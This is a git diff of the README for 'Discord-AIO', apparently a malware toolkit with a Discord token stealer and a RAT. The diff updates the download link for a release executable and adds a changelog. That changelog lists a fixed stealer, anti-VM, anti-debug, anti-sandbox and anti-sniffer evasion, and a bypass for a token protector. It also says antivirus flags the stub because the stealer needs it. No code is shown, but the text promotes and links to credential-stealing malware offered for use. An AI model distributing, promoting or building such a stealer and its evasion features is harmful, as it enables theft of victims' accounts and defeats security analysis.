@@ -23,7 +23,7 @@ I will not be held accountable for any illegal activities.
 [Showcase](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#showcase)<br/>
 [Credits](https://github.com/Nyxonn/Discord-AIO/blob/main/README.md#credits)<br/>
   
-<a href="https://github.com/Nyxonn/Discord-AIO/releases/download/0.7.0/Discord.AIO.exe">
+<a href="https://github.com/Nyxonn/Discord-AIO/releases/download/0.7.1/Discord.AIO.exe">
   <img src="https://user-images.githubusercontent.com/45857590/159923803-401ed8b8-44f6-4553-8d8f-ee5d2522353f.png" width="400" height="160" />
 </a>
 
@@ -181,6 +181,23 @@ Old branch.
 - Fixed RAT 16-Bit error
 - White buttons redesing
 - Centered DAIO
+  
+<div align="center">
+
+**0.7.1**
+  
+</div>
+  
+- Fixed updater
+- Fixed stealer
+- Fixed token encryption
+- Added anti-vm
+- Added anti-debug
+- Added anti-emulation
+- Added anti-sandbox
+- Added anti-sniffer
+- Added bypass for token protector
+- Changed stub extension
 
 <div align="center">
 
@@ -195,7 +212,7 @@ Yes, the program is 100% free and open source.
 On our [discord](https://discord.gg/C8zauKSBR2).
 
 - How to use it?<br />
-You need to compile open source files or download released stable program from [here](https://github.com/Nyxonn/Discord-AIO/releases/download/0.7.0/Discord.AIO.exe) or discord above.
+You need to compile open source files or download released stable program from [here](https://github.com/Nyxonn/Discord-AIO/releases/download/0.7.1/Discord.AIO.exe) or discord above.
 
 - Antivirus reports program as malicious!<br />
 Program contains the stub file which is necessary to make stealer work, it's all open source so if you are extremly scared check it by yourself.
